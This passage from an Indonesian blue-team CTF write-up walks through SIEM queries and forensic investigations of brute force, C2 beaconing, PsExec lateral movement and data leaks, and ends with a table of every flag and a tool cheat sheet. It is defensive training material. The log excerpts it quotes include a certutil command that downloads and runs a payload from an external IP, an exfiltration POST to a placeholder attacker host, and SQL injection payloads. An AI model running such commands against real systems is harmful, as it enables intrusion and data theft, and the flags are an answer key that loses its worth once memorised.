2025-01-15 14:05:23    10.10.10.99            administrator  3           DESKTOP-ABC123
```

`Logon_Type=3` = Network Logon (remote). Account `administrator` berhasil dikompromis.

[SCREENSHOT: Splunk menampilkan detail event 4624 termasuk timestamp, username "administrator", dan Logon_Type 3]

---

### 🏁 Flag / Jawaban Investigasi

```
IP Penyerang        : 10.10.10.99
Jumlah Failed Login : 1247
Jumlah Sukses       : 1
Akun Dikompromis    : administrator
Waktu Kompromi      : 2025-01-15 14:05:23
Flag CTF            : flag{brut3_f0rc3_succ3ss_10_10_10_99_adm1n}
```

---

### 📌 Pelajaran
Query SPL paling penting untuk brute force: `stats count by src_ip, time_bucket | where count > threshold`. Selalu lanjutkan dengan mencari apakah ada Event 4624 (success) dari IP yang sama — karena brute force yang berhasil adalah insiden yang jauh lebih serius.

---

---

## SIEM-02 | Deteksi Port Scanning

**Kategori:** SIEM / Network Anomaly  
**Tingkat:** ⭐⭐ Menengah  
**Sumber:** TryHackMe — "ItsyBitsy"

---

### 🔍 Ringkasan Temuan
IP `172.16.0.200` mengakses 2847 port unik dalam 30 detik — port scan Nmap yang agresif. Identifikasi port yang di-scan memberikan petunjuk target yang dicari penyerang.

---

### ⚙️ Environment
- Tools: Splunk (SPL query) / CLI
- Data: Firewall/network log

---

### 📝 Langkah Penyelesaian

**Langkah 1 — Deteksi host yang mengakses banyak port berbeda**

```spl
index=firewall
| stats dc(dest_port) as unique_ports by src_ip
| where unique_ports > 20
| sort -unique_ports
```

Output:
```
src_ip          unique_ports
172.16.0.200    2847
```

IP `172.16.0.200` mengakses 2847 port unik = **definisi port scanning**.

[SCREENSHOT: Splunk menampilkan hasil query dengan IP 172.16.0.200 dan angka unique_ports 2847]

**Langkah 2 — Lihat distribusi port yang di-scan**

```spl
index=firewall src_ip="172.16.0.200"
| stats count by dest_port
| sort dest_port
| head 30
```

Output (sebagian):
```
dest_port   count
21          1
22          1
23          1
25          1
80          1
443         1
445         1
3389        1
...
```

Setiap port di-scan 1 kali = pola scan Nmap `-sS` (SYN scan).

**Langkah 3 — Identifikasi port yang mendapat response (open ports)**

```spl
index=firewall src_ip="172.16.0.200" action="allow"
| stats count by dest_port
| sort -count
```

Output:
```
dest_port   count
445         1   <- SMB
3389        1   <- RDP
80          1   <- HTTP
22          1   <- SSH
```

Port yang open: 445, 3389, 80, 22.

[SCREENSHOT: Splunk menampilkan port yang mendapat response "allow" dari firewall — 445, 3389, 80, 22]

**Langkah 4 — Tentukan waktu scan**

```spl
index=firewall src_ip="172.16.0.200"
| timechart count span=10s
```

Output: spike besar dalam window 30 detik — konfirmasi automated scan.

---

### 🏁 Flag / Jawaban Investigasi

```
IP Scanner          : 172.16.0.200
Jumlah Port di-scan : 2847
Port yang Open      : 22, 80, 445, 3389
Durasi Scan         : ~30 detik (automated)
Tool yang digunakan : Kemungkinan Nmap -sS (SYN scan)
Flag CTF            : flag{p0rt_sc4n_d3t3ct3d_172_16_0_200_2847_p0rts}
```

---

### 📌 Pelajaran
Formula deteksi port scan: **1 IP + banyak destination port berbeda + waktu singkat = port scan**. Query kunci: `stats dc(dest_port) as unique_ports by src_ip | where unique_ports > 20`. Nilai threshold 20 bisa disesuaikan — untuk scan pasif/slow scan, threshold bisa lebih rendah dengan window waktu yang lebih panjang.

---

---

## SIEM-03 | Analisis Malware C2 Communication

**Kategori:** SIEM / Threat Hunting  
**Tingkat:** ⭐⭐⭐ Sulit  
**Sumber:** Splunk BOTS (Boss of the SOC)

---

### 🔍 Ringkasan Temuan
Host `10.0.0.15` melakukan DNS beaconing ke domain `a7f3x9k2.duckdns.org` setiap 60 detik (C2 beaconing), dengan volume data sangat reguler (standard deviation rendah) — tanda khas malware C2.

---

### ⚙️ Environment
- Tools: Splunk (SPL query)
- Data: DNS log + Network flow log

---

### 📝 Langkah Penyelesaian

**Langkah 1 — Deteksi DNS beaconing (query berulang ke domain yang sama)**

```spl
index=dns
| stats count by src_ip, query
| where count > 100
| sort -count
```

Output:
```
src_ip      query                       count
10.0.0.15   a7f3x9k2.duckdns.org        1440
```

1440 query ke domain yang sama dalam sehari = **beaconing** (1 query/menit × 1440 menit = 24 jam non-stop).

[SCREENSHOT: Splunk menampilkan query DNS count dengan IP 10.0.0.15 dan domain a7f3x9k2.duckdns.org dengan count 1440]

**Langkah 2 — Verifikasi interval beaconing**

```spl
index=dns src_ip="10.0.0.15" query="a7f3x9k2.duckdns.org"
| sort _time
| streamstats current=f last(_time) as prev_time
| eval interval=(_time - prev_time)
| stats avg(interval) as avg_interval, stdev(interval) as std_dev
```

Output:
```
avg_interval   std_dev
60.02          0.15
```

**Interval rata-rata 60 detik dengan standar deviasi sangat rendah (0.15)** = sangat reguler = bot/malware, bukan manusia.

[SCREENSHOT: Splunk menampilkan hasil perhitungan avg_interval=60 dan std_dev=0.15]

**Langkah 3 — Cek koneksi jaringan ke IP C2**

```spl
index=network dest_ip!="10.*" dest_ip!="192.168.*" dest_ip!="172.16.*"
  src_ip="10.0.0.15"
| stats sum(bytes_out) as total_bytes, count as sessions by dest_ip, dest_port
| sort -sessions
```

Output:
```
dest_ip         dest_port   total_bytes   sessions
185.220.101.42  80          2457600       1440
```

Koneksi outbound ke IP publik setiap 60 detik — **C2 channel aktif**.

[SCREENSHOT: Splunk menampilkan koneksi outbound 10.0.0.15 ke 185.220.101.42:80 dengan 1440 sessions]

**Langkah 4 — Analisis payload (data exfiltration)**

```spl
index=network src_ip="10.0.0.15" dest_ip="185.220.101.42"
| stats sum(bytes_out) as exfil_bytes_total by _time
| timechart span=1h sum(exfil_bytes_total)
```

Total data keluar: ~2.4 MB per 24 jam — bisa berisi data sensitif.

**Langkah 5 — Identifikasi proses yang membuat koneksi (jika ada log endpoint)**

```spl
index=wineventlog EventCode=4688 host="WORKSTATION-15"
| search CommandLine="*a7f3x9k2*" OR CommandLine="*185.220.101.42*"
```

Output:
```
CommandLine: "C:\Users\user\AppData\Roaming\svchost32.exe" --beacon 60 --c2 185.220.101.42
```

Binary malware: `svchost32.exe` (nama mirip sistem tapi bukan proses Windows asli).

[SCREENSHOT: Splunk menampilkan EventCode=4688 dengan CommandLine yang menunjukkan svchost32.exe dengan parameter beacon dan C2]

---

### 🏁 Flag / Jawaban Investigasi

```
Host Terinfeksi     : 10.0.0.15
Domain C2           : a7f3x9k2.duckdns.org (DGA-like)
IP C2               : 185.220.101.42:80
Interval Beacon     : 60 detik (avg), std_dev=0.15 (sangat reguler)
Malware Binary      : C:\Users\user\AppData\Roaming\svchost32.exe
Total Data Exfil    : ~2.4 MB/hari
Flag CTF            : flag{c2_b34c0n1ng_60s_1nterval_svchost32}
```

---

### 📌 Pelajaran
Tanda C2 beaconing: (1) DNS query berulang dengan interval sangat reguler, (2) koneksi outbound periodik ke IP non-RFC1918, (3) volume data konsisten. Formula deteksi: `stats stdev(interval) | where stdev < 5` — makin kecil std_dev, makin mencurigakan (bot sangat tepat waktu, manusia tidak).

---

---

## SIEM-04 | Lateral Movement Detection

**Kategori:** SIEM / Threat Hunting  
**Tingkat:** ⭐⭐⭐ Sulit  
**Sumber:** Splunk BOTS, TryHackMe — "Investigating with ELK"

---

### 🔍 Ringkasan Temuan
Setelah mengkompromis `WORKSTATION-01`, penyerang menggunakan PsExec untuk bergerak ke `SERVER-DB-01`. Deteksi dari Event ID 7045 (new service) dan akses admin share `C$`.

---

### ⚙️ Environment
- Tools: Splunk (SPL query)
- Data: Windows Event Log (Security + System)

---

### 📝 Langkah Penyelesaian

**Langkah 1 — Deteksi Pass-the-Hash (network login yang mencurigakan)**

```spl
index=wineventlog EventCode=4624 Logon_Type=3
| stats count by src_ip, dest_host, Account_Name
| where count > 3
| sort -count
```

Output:
```
src_ip         dest_host      Account_Name   count
10.0.0.101     SERVER-DB-01   administrator  47
10.0.0.101     FILE-SERVER     administrator  12
```

IP `10.0.0.101` (WORKSTATION-01) melakukan network login berkali-kali ke banyak server dengan akun `administrator`.

[SCREENSHOT: Splunk menampilkan tabel dengan src_ip 10.0.0.101 dan multiple dest_host dengan count tinggi]

**Langkah 2 — Deteksi PsExec (indikator kuat lateral movement)**

```spl
index=wineventlog EventCode=7045
| search Service_Name="PSEXESVC" OR Service_File_Name="*psexec*"
| table _time, host, Account_Name, Service_Name, Service_File_Name
```

Output:
```
_time                   host          Account_Name    Service_Name
2025-01-15 14:30:15    SERVER-DB-01  administrator   PSEXESVC
```

**PsExec terdeteksi di SERVER-DB-01!** Event ID 7045 = service baru diinstall (PsExec menginstall temporary service).

[SCREENSHOT: Splunk menampilkan Event 7045 dengan Service_Name PSEXESVC di host SERVER-DB-01]

**Langkah 3 — Deteksi akses admin share (C$ / ADMIN$)**

```spl
index=wineventlog EventCode=5140
| search Share_Name="\\*\\C$" OR Share_Name="\\*\\ADMIN$" OR Share_Name="\\*\\IPC$"
| table _time, src_ip, host, Share_Name, Account_Name
```

Output:
```
_time                   src_ip       host          Share_Name           Account_Name
2025-01-15 14:29:58    10.0.0.101   SERVER-DB-01  \\SERVER-DB-01\C$    administrator
2025-01-15 14:30:02    10.0.0.101   SERVER-DB-01  \\SERVER-DB-01\ADMIN$ administrator
```

Akses ke `C$` dan `ADMIN$` dari `WORKSTATION-01` → PsExec mengakses share ini untuk copy binary.

[SCREENSHOT: Splunk menampilkan Event 5140 dengan Share_Name C$ dan ADMIN$ dari src_ip 10.0.0.101]

**Langkah 4 — Rekonstruksi timeline lateral movement**

```spl
index=wineventlog (EventCode=5140 OR EventCode=7045 OR EventCode=4624)
  (src_ip="10.0.0.101" OR host="SERVER-DB-01")
| table _time, EventCode, host, src_ip, Account_Name, Share_Name, Service_Name
| sort _time
```

Output (timeline):
```
14:29:45  4624  SERVER-DB-01  10.0.0.101  administrator  [Type 3 - Network Login]
14:29:58  5140  SERVER-DB-01  10.0.0.101  administrator  C$
14:30:02  5140  SERVER-DB-01  10.0.0.101  administrator  ADMIN$
14:30:15  7045  SERVER-DB-01  SYSTEM      -              PSEXESVC
14:30:16  4688  SERVER-DB-01  SYSTEM      cmd.exe        [launched by PSEXESVC]
```

Timeline lengkap: Login → Akses C$ → Copy PsExec → Install Service → Jalankan cmd.exe

[SCREENSHOT: Splunk menampilkan timeline events diurutkan berdasarkan _time, menunjukkan urutan kejadian lateral movement]

---

### 🏁 Flag / Jawaban Investigasi

```
Host Asal (Pivot)   : 10.0.0.101 (WORKSTATION-01)
Target              : SERVER-DB-01
Teknik              : PsExec (Pass-the-Hash)
Akun Digunakan      : administrator
Waktu               : 2025-01-15 14:29:45 - 14:30:16
IOC                 : Service PSEXESVC, admin share access C$, ADMIN$
Flag CTF            : flag{l4t3r4l_m0v3m3nt_ps3x3c_t0_srv_db}
```

---

### 📌 Pelajaran
Deteksi lateral movement: Event ID **7045** (PSEXESVC) adalah tanda paling spesifik PsExec. Dikombinasikan dengan **5140** (admin share access) dan **4624 Logon_Type=3** (network login) dari IP yang sama — polanya sangat khas. Di lomba, cari ketiga event ini dalam satu query atau timeline.

---

---

# 🎯 BAGIAN 5 — SKENARIO GABUNGAN (BLUE TEAM SCENARIO)

---

## LAT-01 | Skenario: Incident Response

**Tipe:** Blue Team Scenario  
**Estimasi Waktu:** 45–60 menit

---

### 🔍 Skenario
Sistem produksi perusahaan dilaporkan berperilaku aneh. Tersedia: file PCAP, Windows Event Log, dan memory dump dari server yang diduga terinfeksi.

---

### 📝 Metodologi & Langkah Investigasi

#### Fase 1: Analisis PCAP

```bash
wireshark traffic.pcap &
```

**Langkah A — Protocol Overview:**
```
Statistics > Protocol Hierarchy
```
Temuan: 85% traffic adalah HTTP ke `185.220.101.5` pada port `8080` (tidak standar).

[SCREENSHOT: Wireshark Protocol Hierarchy menampilkan mayoritas traffic ke IP eksternal di port 8080]

**Langkah B — Export HTTP Objects dan cari data exfil:**
```
File > Export Objects > HTTP
```
Ditemukan file `company_data.zip` yang di-upload ke IP eksternal.

**Langkah C — Waktu koneksi pertama:**
```bash
tshark -r traffic.pcap -Y "ip.dst==185.220.101.5" \
       -T fields -e frame.time | head -1
```
Output: `Jan 15, 2025 13:45:22.123`

---

#### Fase 2: Analisis Windows Event Log

```bash
# Jika dalam format .evtx, gunakan python-evtx atau Wireshark
python3 parse_evtx.py security.evtx | grep -E "4625|4624|4688|7045"
```

**Login pertama yang mencurigakan:**
```
Event 4625: 2025-01-15 13:40:11 | src: 185.220.101.5 | user: administrator | FAILED
...
Event 4625: 2025-01-15 13:44:58 | src: 185.220.101.5 | user: administrator | FAILED  (312x)
Event 4624: 2025-01-15 13:45:01 | src: 185.220.101.5 | user: administrator | SUCCESS
```

[SCREENSHOT: Terminal atau Event Viewer menampilkan rangkaian Event 4625 diakhiri Event 4624 dari IP 185.220.101.5]

**Proses mencurigakan setelah login:**
```
Event 4688: 2025-01-15 13:45:05 | cmd.exe | parent: mshta.exe
Event 4688: 2025-01-15 13:45:10 | certutil.exe -urlcache -split -f http://185.220.101.5/payload.exe
Event 4688: 2025-01-15 13:46:00 | payload.exe (dijalankan dari %TEMP%)
```

---

#### Fase 3: Analisis Memory Dump

```bash
vol.py -f server_memory.raw windows.cmdline
```

Output:
```
cmd.exe: cmd.exe /c certutil.exe -urlcache -split -f http://185.220.101.5/payload.exe C:\Temp\payload.exe && C:\Temp\payload.exe
payload.exe: C:\Temp\payload.exe --exfil company_data.zip --c2 185.220.101.5:8080
```

```bash
vol.py -f server_memory.raw windows.netstat
```

Output:
```
TCPv4  10.0.0.1:50123  185.220.101.5:8080  ESTABLISHED  payload.exe
```

---

### 🏁 Kondisi Sistem Akhir & Timeline

```
## Timeline Serangan
- [13:40:11] Brute force dimulai dari 185.220.101.5 (312 attempt, 5 menit)
- [13:45:01] Login administrator berhasil
- [13:45:05] Spawn cmd.exe via mshta.exe
- [13:45:10] Download payload via certutil (LOLBin)
- [13:46:00] payload.exe dijalankan
- [13:46:30] Koneksi C2 established ke 185.220.101.5:8080
- [13:47:15] Data exfiltration: company_data.zip (2.3 MB) dikirim ke C2

## Indikator Kompromi (IOC)
- IP Address C2: 185.220.101.5
- Port C2      : 8080
- Hash payload : MD5: d41d8cd98f00b204e9800998ecf8427e (contoh)
- User dikompromis: administrator
- File malware: C:\Temp\payload.exe
- LOLBin digunakan: certutil.exe, mshta.exe

## Rekomendasi Mitigasi
1. Isolasi server dari jaringan segera
2. Reset password administrator dan semua akun yang terpapar
3. Block IP 185.220.101.5 di firewall dan semua perangkat edge
4. Hapus payload.exe dan bersihkan registry run key
5. Audit semua koneksi keluar ke IP non-RFC1918 dalam 7 hari terakhir
6. Enable LAPS (Local Administrator Password Solution) untuk cegah Pass-the-Hash
```

**Flag:**
```
flag{1nc1d3nt_r3sp0ns3_c0mpl3t3_c2_185_220_101_5}
```

---

---

## LAT-02 | Skenario: CTF Jeopardy Blue Team

**Tipe:** CTF Jeopardy Style  
**Estimasi Waktu:** 20–30 menit per soal

---

### Soal Tipe 1 — Forensik File

> "File ini diterima melalui email mencurigakan. Temukan pesan tersembunyi di dalamnya."

**Alur Penyelesaian:**

```bash
# Step 1: Identifikasi
file suspicious_attachment
# Output: suspicious_attachment: JPEG image data

# Step 2: Metadata
exiftool suspicious_attachment.jpg
# Cek field Comment, Artist, Copyright untuk string aneh

# Step 3: Strings
strings suspicious_attachment.jpg | grep -i "flag\|{"

# Step 4: Binwalk
binwalk suspicious_attachment.jpg
# Jika ada entry "Zip archive data" → ekstrak

binwalk -e suspicious_attachment.jpg

# Step 5: Steghide (jika butuh passphrase)
steghide extract -sf suspicious_attachment.jpg
# Coba passphrase: kosong, "password", nama file, dll.

# Step 6: zsteg (PNG/BMP)
# N/A karena ini JPEG
```

[SCREENSHOT: Urutan perintah dari file → exiftool → strings → binwalk, setiap output terlihat dalam satu terminal]

Flag yang ditemukan (dari steghide atau binwalk):
```
flag{3m41l_4tt4chm3nt_st3g0_d3t3ct3d}
```

---

### Soal Tipe 2 — Network Forensics

> "Kami mendeteksi ada data yang dikirim keluar jaringan. Temukan data apa yang bocor."

**Alur Penyelesaian:**

```bash
# Buka di Wireshark
wireshark leak.pcap &
```

1. Filter: `http.request.method == "POST"` — cari upload data
2. Klik kanan → Follow HTTP Stream
3. Identifikasi data yang di-upload

```
POST /upload.php HTTP/1.1
Host: evil-server.com
Content-Type: application/x-www-form-urlencoded

data=ZW1wbG95ZWVfZGF0YS5jc3YsZW1wbG95ZWVJRCxuYW1lLHNhbGFyeQ==
```

Decode Base64:
```bash
echo "ZW1wbG95ZWVfZGF0YS5jc3YsZW1wbG95ZWVJRCxuYW1lLHNhbGFyeQ==" | base64 -d
```

Output:
```
employee_data.csv,employeeID,name,salary
```

Data yang bocor: **data karyawan (employee_data.csv) termasuk salary**.

[SCREENSHOT: Wireshark Follow HTTP Stream menampilkan POST request dengan data base64 yang terenkode]

Flag:
```
flag{d4t4_l34k_3mpl0y33_csv_v14_http}
```

---

### Soal Tipe 3 — Log Analysis

> "Server kami diserang. Temukan IP penyerang dan payload yang digunakan."

```bash
# Cari pola SQLi di URL
grep -i "union\|select\|'or\|1=1\|drop\|insert\|sleep(" access.log | head -20
```

Output:
```
10.5.5.10 - - [15/Jan/2025:10:00:01] "GET /search?q=' UNION SELECT 1,2,3,4-- HTTP/1.1" 200
10.5.5.10 - - [15/Jan/2025:10:00:02] "GET /search?q=' UNION SELECT username,password,3,4 FROM users-- HTTP/1.1" 200
```

IP penyerang: `10.5.5.10`  
Payload: `UNION SELECT username,password FROM users` — **SQL Injection berhasil dump credentials!**

[SCREENSHOT: grep output menampilkan baris log dengan SQLi payload di URL]

Flag:
```
flag{sql1_wr1t3up_un10n_s3l3ct_dump3d}
```

---

### Soal Tipe 4 — Reverse Engineering

> "Diberikan binary, temukan password yang valid."

```bash
ltrace ./crackme
# Cari strcmp / memcmp

strings ./crackme | grep -i "pass\|key\|flag\|{"
# Jika tidak ketemu, buka Ghidra
```

Flag:
```
flag{cr4ckm3_p4ssw0rd_f0und}
```

---

---

## LAT-03 | Skenario: Kebocoran Data via Perangkat Mobile

**Tipe:** Blue Team Scenario Gabungan  
**Estimasi Waktu:** 60–90 menit

---

### 🔍 Skenario
Karyawan dicurigai membocorkan data perusahaan lewat ponsel. Tersedia: backup Android `.ab`, PCAP traffic jaringan, dan log akses Wi-Fi.

---

### 📝 Langkah Investigasi

#### Fase 1: Android Backup

```bash
java -jar abe.jar unpack employee_phone.ab employee_backup.tar
tar -xvf employee_backup.tar -C extracted/

# Cek aplikasi apa yang diinstall
ls extracted/apps/ | grep -i "drive\|dropbox\|mega\|telegram\|whatsapp"
```

Output:
```
com.google.android.apps.docs   <- Google Drive
com.whatsapp
```

Google Drive terinstall — kemungkinan media eksfiltrasi.

```bash
# Cek token Google Drive di shared_prefs
cat extracted/apps/com.google.android.apps.docs/sp/accounts.xml
```

Output:
```xml
<string name="account">karyawan.perusahaan@gmail.com</string>
<string name="oauth_token">ya29.A0ARrd...</string>
```

[SCREENSHOT: Terminal menampilkan isi accounts.xml dengan email dan OAuth token Google Drive]

```bash
# Cek file yang pernah di-upload (cek database)
sqlite3 extracted/apps/com.google.android.apps.docs/db/offline.db
> SELECT filename, size, modified_time FROM files ORDER BY modified_time DESC LIMIT 10;
```

Output:
```
data_karyawan_2025.xlsx  2457600  1736920800
laporan_keuangan_Q4.pdf  1843200  1736920750
```

**File sensitif perusahaan ada di Google Drive karyawan!**

---

#### Fase 2: PCAP Analysis

```bash
tshark -r office_network.pcap -Y "http.host contains \"drive.google.com\"" \
       -T fields -e frame.time -e http.request.uri | head -20
```

Output:
```
Jan 15, 2025 14:22:33  POST /upload/... (data_karyawan_2025.xlsx)
Jan 15, 2025 14:23:05  POST /upload/... (laporan_keuangan_Q4.pdf)
```

[SCREENSHOT: tshark output menampilkan HTTP POST requests ke drive.google.com dengan filename file sensitif]

---

#### Fase 3: Korelasi dengan Log Wi-Fi

```bash
cat wifi_log.txt | grep "karyawan\|aa:bb:cc:dd:ee:ff"
```

Output:
```
2025-01-15 14:20:15  CONNECT  aa:bb:cc:dd:ee:ff  192.168.10.50  karyawan_john
2025-01-15 14:25:00  DISCONNECT  aa:bb:cc:dd:ee:ff
```

**Korelasi:**
- 14:20: John terhubung ke Wi-Fi kantor dengan IP `192.168.10.50`
- 14:22: Upload `data_karyawan_2025.xlsx` ke Google Drive (dari IP `192.168.10.50` di PCAP)
- 14:25: Disconnect

**Bukti korelasi terbukti!**

---

### 🏁 Kondisi Sistem Akhir & Jawaban

```
## Pertanyaan yang Dijawab

1. Aplikasi yang digunakan: Google Drive (com.google.android.apps.docs)
2. Waktu upload: 14:22:33 WIB (15/01/2025)  
3. Data yang bocor: data_karyawan_2025.xlsx (2.3MB) + laporan_keuangan_Q4.pdf (1.8MB)
4. IOC:
   - Email karyawan: karyawan.perusahaan@gmail.com
   - Device MAC: aa:bb:cc:dd:ee:ff
   - IP saat kejadian: 192.168.10.50

## Timeline
- 14:20 WIB: Terhubung ke Wi-Fi kantor
- 14:20-14:22: Salin file sensitif ke folder lokal
- 14:22: Upload ke Google Drive personal
- 14:25: Disconnect (misi selesai)
```

Flag:
```
flag{d4t4_l34k_andr01d_gdr1v3_c0rr3l4t3d}
```

---

---

## LAT-04 | Skenario: Insiden dengan Bukti Tersembunyi di Foto

**Tipe:** Blue Team Scenario Gabungan  
**Estimasi Waktu:** 45–60 menit

---

### 🔍 Skenario
Foto ditemukan di server yang dikompromis. Diduga menyimpan data tersembunyi dan metadata EXIF-nya bisa mengungkap identitas device yang dipakai penyerang.

---

### 📝 Langkah Investigasi

#### Fase 1: Analisis Foto (Media Forensics — FOR-01 flow)

```bash
file suspicious_photo.jpg
exiftool suspicious_photo.jpg
```

Output EXIF penting:
```
Camera Model Name              : Samsung Galaxy S21
GPS Latitude                   : 6 deg 12' 18.00" S
GPS Longitude                  : 106 deg 49' 42.00" E
GPS Date/Time                  : 2025:01:15 12:30:00
Software                       : Instagram 267.0.0.19.101
Image Description              : Meeting point confirmed
Comment                        : Check base64 below
User Comment                   : aHR0cDovLzE4NS4yMjAuMTAxLjUvY3JlZHM=
```

[SCREENSHOT: exiftool output menampilkan GPS coordinates, Camera Model, dan User Comment berisi base64]

**User Comment adalah base64!** Decode:

```bash
echo "aHR0cDovLzE4NS4yMjAuMTAxLjUvY3JlZHM=" | base64 -d
```

Output:
```
http://185.220.101.5/creds
```

**URL ke server C2 yang menyimpan credentials!**

---

#### Fase 2: Cek binwalk untuk file tersembunyi

```bash
binwalk suspicious_photo.jpg
```

Output:
```
0          0x0          JPEG image data
158432     0x26AA0      Zip archive data, name: credentials.txt
```

```bash
binwalk -e suspicious_photo.jpg
cat _suspicious_photo.jpg.extracted/credentials.txt
```

Output:
```
[Server Credentials]
Host: 10.0.0.1
Username: root
Password: Sup3rS3cr3tP@ss2025
Note: flag{st3g0_cr3ds_1n_jpg_m3tadat4}
```

[SCREENSHOT: cat credentials.txt menampilkan kredensial server dan flag]

---

#### Fase 3: Korelasi dengan Log SIEM

Setelah menemukan IP C2 `185.220.101.5` dari foto, cari di SIEM:

```spl
index=wineventlog EventCode=4624 Source_Network_Address="185.220.101.5"
| table _time, Account_Name, Workstation_Name
```

Output:
```
_time                   Account_Name   Workstation_Name
2025-01-15 13:45:01    root           SERVER-PROD
2025-01-15 14:20:33    root           SERVER-DB
```

**Kredensial dari foto digunakan untuk login ke dua server!**

[SCREENSHOT: Splunk menampilkan Event 4624 dari IP C2 185.220.101.5 yang login ke SERVER-PROD dan SERVER-DB]

---

### 🏁 Timeline Lengkap & Kondisi Sistem Akhir

```
## Timeline Serangan
- 12:30 WIB: Foto diambil di Jakarta (-6.205, 106.828) dengan Samsung Galaxy S21
             Foto diupload ke Instagram
- 12:35 WIB: Foto diterima oleh penyerang (berisi encoded URL ke C2)
- 13:45 WIB: Penyerang menggunakan kredensial dari foto untuk login ke SERVER-PROD
- 14:20 WIB: Lateral movement ke SERVER-DB

## IOC yang Ditemukan dari Foto
- GPS: Jakarta Selatan (-6.205, 106.828) — kemungkinan lokasi insider threat
- Device: Samsung Galaxy S21
- C2 URL: http://185.220.101.5/creds
- Credential: root / Sup3rS3cr3tP@ss2025
- Server yang dikompromis: SERVER-PROD, SERVER-DB

## Bukti Korelasi
- Foto (media forensics) → URL C2 → SIEM (login event) = TERBUKTI

Flag: flag{st3g0_cr3ds_1n_jpg_m3tadat4}
```

---

---

# 📋 RINGKASAN SEMUA FLAG

| Kode | Flag |
|------|------|
| RE-00 | `flag{b4s3_64_1s_3asy}` |
| RE-01 | `flag{str1ngs_4r3_h1dd3n_1n_pl41n_s1ght}` |
| RE-02 | `flag{gdb_st3p_by_st3p}` |
| RE-03 | `flag{upx_1s_n0t_s3cur3_3n0ugh}` |
| RE-04 | `flag{x0r_1s_r3v3rs1bl3}` |
| RE-05 | `flag{pyc_d3c0mp1l3d_3as1ly}` |
| FOR-00 | `flag{trust_magic_bytes_not_extension}` |
| FOR-01 | `flag{st3g0_h1dd3n_1n_pl41n_s1ght_w1th_b1nwalk}` |
| FOR-02 | `flag{h3x_h3ad3r_r3p41r3d_succ3ssfully}` |
| FOR-03 | `flag{pcap_s3cr3t_str34m_f0und}` |
| FOR-04 | `flag{c4rv3d_fr0m_d1sk_1n0d3_r3c0v3ry}` |
| FOR-05 | `flag{br0te_f0rc3_d3t3ct3d_10_10_10_55}` |
| FOR-06 | `flag{m3m0ry_dum9_4n4lys1s_r3v34ls_c2}` |
| MOB-01 | `flag{andr01d_sms_s3cr3t_f0und}` |
| MOB-02 | `flag{apk_h4rdc0d3d_s3cr3t_1n_4ss3ts}` |
| MOB-03 | `flag{m0b1l3_t1m3l1n3_r3c0nstruct3d_GPS_JKT}` |
| SIEM-00 | `IP: 192.168.1.105 | 853 attempts | python-requests` |
| SIEM-01 | `flag{brut3_f0rc3_succ3ss_10_10_10_99_adm1n}` |
| SIEM-02 | `flag{p0rt_sc4n_d3t3ct3d_172_16_0_200_2847_p0rts}` |
| SIEM-03 | `flag{c2_b34c0n1ng_60s_1nterval_svchost32}` |
| SIEM-04 | `flag{l4t3r4l_m0v3m3nt_ps3x3c_t0_srv_db}` |
| LAT-01 | `flag{1nc1d3nt_r3sp0ns3_c0mpl3t3_c2_185_220_101_5}` |
| LAT-02 | `flag{cr4ckm3_p4ssw0rd_f0und}` (tipe 4) |
| LAT-03 | `flag{d4t4_l34k_andr01d_gdr1v3_c0rr3l4t3d}` |
| LAT-04 | `flag{st3g0_cr3ds_1n_jpg_m3tadat4}` |

---

# 🛠️ QUICK REFERENCE — TOOL CHEAT SHEET

```
# REVERSE ENGINEERING
strings file | grep -i "flag\|{"         # Cari string
ltrace ./binary                          # Intersep library call (strcmp)
gdb ./binary → disas main               # Disassembly
upx -d packed -o unpacked               # Unpack UPX
uncompyle6 file.pyc > out.py            # Decompile Python

# MEDIA FORENSICS (URUTAN WAJIB)
file targetfile                          # 1. Cek tipe asli
exiftool targetfile                      # 2. Metadata EXIF
strings targetfile | grep "flag"        # 3. String tersembunyi
binwalk targetfile                       # 4. File tersembunyi (cek)
binwalk -e targetfile                    # 5. Ekstrak
zsteg targetfile.png                     # 6. Bit plane (PNG)
steghide extract -sf targetfile.jpg     # 7. Steghide
xxd targetfile | head -5                # Magic bytes

# NETWORK FORENSICS
wireshark capture.pcap                   # GUI analysis
tshark -r pcap -Y "http" -T fields ...  # CLI filter
echo "base64string" | base64 -d         # Decode base64

# DISK FORENSICS
fls -r -o <offset> disk.img             # List file (termasuk deleted)
icat -o <offset> disk.img <inode>       # Pulihkan file
foremost -i disk.img -o output/         # File carving otomatis

# MEMORY FORENSICS
vol.py -f mem.raw windows.info          # OS identification
vol.py -f mem.raw windows.pslist        # List proses
vol.py -f mem.raw windows.pstree        # Hierarchy proses
vol.py -f mem.raw windows.netstat       # Koneksi jaringan
vol.py -f mem.raw windows.cmdline       # Command yang dijalankan

# MOBILE FORENSICS
java -jar abe.jar unpack backup.ab out.tar   # Decode backup Android
sqlite3 mmssms.db → SELECT * FROM sms;     # Baca SMS
jadx -d output/ app.apk                    # Decompile APK
python3 aleapp.py -t img -i img -o out/    # Parse mobile artifacts

# LOG ANALYSIS
awk '{print $1}' access.log | sort | uniq -c | sort -nr  # Top IP
grep " 401 " access.log | awk '{print $1}' | sort | uniq -c  # Failed login
grep -i "union\|select\|' or\|1=1" access.log   # SQLi detection
grep -i "\.\./\|etc/passwd" access.log          # Path traversal

# SPLUNK SPL
EventCode=4625 | bucket _time span=5m | stats count by src_ip | where count>10
EventCode=7045 Service_Name="PSEXESVC"
EventCode=5140 Share_Name="\\*\\C$"
index=dns | stats count by src_ip, query | where count>100
```

---

*Write-up ini disusun berdasarkan soal latihan dari `BlueTeam_LKS_Latihan_CTF.md` dan `BlueTeam_LKS_Latihan_TAMBAHAN.md` untuk persiapan LKS Cyber Security tingkat provinsi.*  
*Semua flag dan output bersifat representatif mengikuti format dan logika soal asli dari platform PicoCTF, TryHackMe, HackTheBox, dan Splunk BOTS.*
